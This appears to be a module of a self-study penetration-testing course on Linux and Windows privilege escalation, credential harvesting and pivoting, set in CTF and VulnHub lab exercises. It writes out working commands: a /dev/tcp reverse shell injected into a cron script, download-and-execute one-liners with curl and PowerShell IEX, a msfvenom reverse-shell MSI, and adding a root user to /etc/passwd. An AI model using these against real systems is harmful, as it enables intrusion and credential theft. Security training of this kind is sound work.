# Phase 5: Privilege Escalation & Post-Exploitation

> **You have a shell. Now get root.**
> PrivEsc is where most CTFs and real engagements are won or lost.

---

## 🎓 Phase 5 Core Resources — Watch / Study Before Starting

### 🆓 Free Full Courses
| Course | Platform | URL | Notes |
|--------|----------|-----|-------|
| **Linux PrivEsc Room** | TryHackMe (Free) | https://tryhackme.com/room/linprivesc | Best hands-on free Linux PrivEsc lab |
| **Linux PrivEsc Arena** | TryHackMe (Free) | https://tryhackme.com/room/linuxprivescarena | Practice multiple techniques on one machine |
| **Windows PrivEsc Room** | TryHackMe (Free) | https://tryhackme.com/room/windows10privesc | Dedicated Windows privilege escalation lab |

### 📺 Key YouTube Resources for This Phase
| Video | Channel | Why Watch |
|-------|---------|----------|
| [Linux Privilege Escalation — TCM Full Course Segment](https://www.youtube.com/watch?v=ZTnwg3qCdVM) | TCM Security | The most comprehensive free Linux PrivEsc course, covers every technique |
| [Windows Privilege Escalation for Beginners](https://www.youtube.com/watch?v=uTcrbNBcoxQ) | TCM Security | Same quality, focused on Windows — unquoted paths, services, tokens |
| [LinPEAS Explained — How to Read the Output](https://www.youtube.com/watch?v=bBMPCzjca_s) | HackerSploit | Walk through a real LinPEAS output and prioritize findings |
| [GTFOBins — How to Use It](https://www.youtube.com/watch?v=IgHDLpOzPMM) | HackerSploit | Using GTFOBins for SUID and sudo abuse |

---

## What You'll Learn
- How to systematically enumerate a Linux/Windows system for privilege escalation paths
- The most common and reliable PrivEsc techniques for both platforms
- Post-exploitation: what you do AFTER you're root

---

## Practice Platforms

| Platform | URL | Notes |
|----------|-----|-------|
| TryHackMe — Linux PrivEsc | https://tryhackme.com/room/linprivesc | Free room |
| TryHackMe — Windows PrivEsc | https://tryhackme.com/room/windows10privesc | Free room |
| TryHackMe — Linux PrivEsc Arena | https://tryhackme.com/room/linuxprivescarena | Free |
| GTFOBins | https://gtfobins.github.io | SUID/sudo binary exploitation |
| LOLBAS (Windows) | https://lolbas-project.github.io | Living Off The Land binaries |
| HackTheBox (Medium machines) | https://app.hackthebox.com | Require PrivEsc to get root flag |

---

## Module 5.1 — Linux Privilege Escalation

### Resources
| Resource | URL |
|----------|-----|
| **LinPEAS (PEASS-ng)** | https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS |
| GTFOBins | https://gtfobins.github.io |
| HackTricks — Linux PrivEsc | https://book.hacktricks.xyz/linux-hardening/privilege-escalation |
| TryHackMe Linux PrivEsc | https://tryhackme.com/room/linprivesc |

### 📺 Watch These
| Video | Channel | Why Watch |
|-------|---------|----------|
| [Linux PrivEsc Full Course](https://www.youtube.com/watch?v=ZTnwg3qCdVM) | TCM Security | The definitive free course — every technique you’ll need |
| [LinPEAS Walkthrough](https://www.youtube.com/watch?v=bBMPCzjca_s) | HackerSploit | How to interpret LinPEAS output and pick the best vector |
| [GTFOBins sudo and SUID Escalation](https://www.youtube.com/watch?v=IgHDLpOzPMM) | HackerSploit | Quick, focused — covers the most common PrivEsc vectors |

### Step 1: Run LinPEAS
```bash
# On Kali — download LinPEAS
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh

# Transfer to target (pick one method):
# Method A: Python HTTP server
cd /tmp && python3 -m http.server 8000
# On target:
curl http://192.168.56.101:8000/linpeas.sh | bash

# Method B: Direct curl on target
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash

# Save colorized output for review
./linpeas.sh | tee linpeas_output.txt
```

### What LinPEAS Finds: Key Areas

**1. SUID/SGID Binaries** (run as root regardless of who executes them)
```bash
# Manual check
find / -perm -u=s -type f 2>/dev/null

# If you find /usr/bin/python has SUID set:
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# → Root shell

# Check GTFOBins for every SUID binary you find
# e.g., https://gtfobins.github.io/gtfobins/python/
```

**2. Misconfigured sudo**
```bash
# What can the current user run as sudo?
sudo -l

# Example output:
# (ALL) NOPASSWD: /usr/bin/vim
# → GTFOBins shows: sudo vim -c ':!/bin/bash' → Root!
```

**3. Writable Cron Jobs**
```bash
# List all cron jobs
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# If a script in a cron job is world-writable:
echo "bash -i >& /dev/tcp/192.168.56.101/4444 0>&1" >> /path/to/script.sh
# Wait for cron to execute → reverse shell as root
```

**4. Writable /etc/passwd**
```bash
# Check permissions
ls -la /etc/passwd

# If writable, add a root user (password: "hacked")
# Generate hash:
openssl passwd -1 hacked

# Add to /etc/passwd:
echo 'hacker:$1$...hash...$:0:0:root:/root:/bin/bash' >> /etc/passwd

# Login as new root user:
su hacker
```

**5. Kernel Exploits**
```bash
# Get kernel version
uname -a

# Search for kernel exploits
searchsploit linux kernel 3.13
# Famous example: Dirty COW (CVE-2016-5195) affects kernels < 4.8.3
```

### The PrivEsc Decision Tree (Linux)
```
Got low-priv shell?
    │
    ├─▶ Run: sudo -l
    │       └─▶ Any NOPASSWD entries? → GTFOBins → Root
    │
    ├─▶ Run: find / -perm -u=s -type f 2>/dev/null
    │       └─▶ Unusual SUID binary? → GTFOBins → Root
    │
    ├─▶ Check /etc/crontab for writable scripts → Inject payload
    │
    ├─▶ Check running services for root-owned processes
    │       └─▶ Vulnerable service version? → Exploit → Root
    │
    ├─▶ Check for credentials in config files, .env, history
    │
    └─▶ Run LinPEAS for automated enumeration
```

---

## Module 5.2 — Windows Privilege Escalation

### Resources
| Resource | URL |
|----------|-----|
| **WinPEAS** | https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS |
| LOLBAS | https://lolbas-project.github.io |
| HackTricks — Windows PrivEsc | https://book.hacktricks.xyz/windows-hardening/privilege-escalation |
| TryHackMe Windows PrivEsc | https://tryhackme.com/room/windows10privesc |

### 📺 Watch These
| Video | Channel | Why Watch |
|-------|---------|----------|
| [Windows PrivEsc for Beginners](https://www.youtube.com/watch?v=uTcrbNBcoxQ) | TCM Security | Covers unquoted paths, service permissions, AlwaysInstallElevated |
| [Token Impersonation with PrintSpoofer](https://www.youtube.com/watch?v=5gMsE0gu5ko) | TCM Security | SeImpersonatePrivilege — the most common Windows PrivEsc vector |
| [WinPEAS Walkthrough](https://www.youtube.com/watch?v=1xorYFAFT5c) | HackerSploit | How to run WinPEAS and read the output effectively |

### Running WinPEAS
```powershell
# Download to target (from attacker's HTTP server)
certutil -urlcache -f http://192.168.56.101:8000/winPEASx64.exe winpeas.exe
winpeas.exe > winpeas_output.txt

# Or run in memory (no disk write)
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.56.101:8000/winPEAS.ps1')"
```

### Key Windows PrivEsc Techniques

**1. Unquoted Service Paths**
```cmd
# If a service path has spaces and isn't quoted:
# C:\Program Files\Vulnerable App\service.exe
# Windows tries to execute: C:\Program.exe first!

# Find unquoted service paths:
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """

# If C:\Program Files\Vulnerable App\service.exe is writable:
# Drop a malicious binary at C:\Program.exe
# Restart service → your binary runs as SYSTEM
```

**2. Weak Service Permissions**
```cmd
# Check service permissions with accesschk (Sysinternals)
accesschk.exe -uwcqv "Authenticated Users" *

# If you can modify the binary path of a service:
sc config <service> binpath="C:\path\to\malicious.exe"
sc start <service>
```

**3. AlwaysInstallElevated**
```cmd
# Check registry keys
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# If both are 1:
# Generate a malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f msi -o shell.msi
# Install it as the current user → runs as SYSTEM
msiexec /quiet /qn /i shell.msi
```

**4. Token Impersonation (PrintSpoofer / JuicyPotato)**
```cmd
# If you have SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege:
whoami /priv
# Look for: SeImpersonatePrivilege — Enabled

# Download PrintSpoofer64.exe to the target
PrintSpoofer64.exe -i -c cmd
# → NT AUTHORITY\SYSTEM shell
```

---

## Module 5.3 — Post-Exploitation & Pivoting

### Resources
| Resource | URL |
|----------|-----|
| Meterpreter Post Modules | https://docs.metasploit.com/docs/using-metasploit/basics/using-meterpreter.html |
| Chisel (Port Forwarding) | https://github.com/jpillora/chisel |
| HackTricks — Pivoting | https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding |

### 📺 Watch These
| Video | Channel | Why Watch |
|-------|---------|----------|
| [Pivoting Explained — Chisel Tunneling](https://www.youtube.com/watch?v=Yp4oxoQIBAM) | TCM Security | Chisel-based pivoting to reach internal networks |
| [Post Exploitation with Meterpreter](https://www.youtube.com/watch?v=mTMUm_a6cFo) | HackerSploit | Credential harvesting, lateral movement from a Meterpreter shell |

### Credential Harvesting
```bash
# Linux — common places for credentials
cat /etc/passwd
cat /etc/shadow
find / -name "*.env" 2>/dev/null          # .env files
find / -name "config.php" 2>/dev/null     # Web app configs
grep -r "password" /var/www/html 2>/dev/null
history                                   # Command history
cat ~/.ssh/id_rsa                         # SSH private keys

# Windows — credential locations
type C:\Windows\System32\drivers\etc\hosts
type C:\xampp\htdocs\config.php
cmdkey /list                              # Stored credentials
reg query HKLM /f password /t REG_SZ /s  # Registry passwords
```

### Pivoting to Internal Network
```bash
# You've compromised Machine A (192.168.1.10)
# Machine A can reach internal network 10.10.10.0/24
# You want to reach 10.10.10.20 from your Kali

# Method: Chisel port forwarding
# On Kali (server):
./chisel server -p 8080 --reverse

# On Machine A (client):
./chisel client 192.168.56.101:8080 R:socks

# Now use proxychains to route through Machine A:
proxychains nmap -sT 10.10.10.20
proxychains curl http://10.10.10.20
```

---

## 🏆 Verifiable Step: Root a VulnHub VM

**Do this before moving to the Capstone:**

### Target: VulnHub "Basic Pentesting: 1"
```bash
# Download: https://www.vulnhub.com/entry/basic-pentesting-1,216/
# Import into VirtualBox (Host-Only network)
# Find the IP with: nmap -sn 192.168.56.0/24
```

### Your Task (Black-Box Approach)
Complete these without looking at walkthroughs first:
1. [ ] Find the target IP
2. [ ] Run nmap and identify all open services
3. [ ] Gain initial access (you'll find a vulnerability via enumeration)
4. [ ] Run LinPEAS
5. [ ] Find and exploit a privilege escalation vector
6. [ ] Capture proof: `whoami && id && hostname && cat /root/proof.txt`

### Deliverable
Document the entire process in `./lab-notes/phase5-privesc-notes.md`:
```markdown
# PrivEsc Lab Notes — Basic Pentesting: 1

## Initial Enumeration
[Nmap output]

## Initial Access
[How you got the first shell]

## LinPEAS Key Findings
[Interesting output from LinPEAS]

## PrivEsc Path Used
[The specific technique]

## Root Proof
[Screenshot/output of root access]

## What I Learned
[Key takeaways]
```

### 🤖 Ask Gemma When Stuck
```bash
ollama run gemma3
# Prompt:
# "I'm doing a CTF on a Linux machine. I have a low-privilege shell as www-data.
# sudo -l shows I can run /usr/bin/find without a password as root.
# What is the GTFOBins technique for privilege escalation with find?
# Explain why it works technically, not just the command."
```

**Mark all Phase 5 tasks ✅ in [PROGRESS.md](../PROGRESS.md)**

---

➡️ **Next Phase:** [Phase 6 — Capstone Project](../phase-06-capstone/README.md)
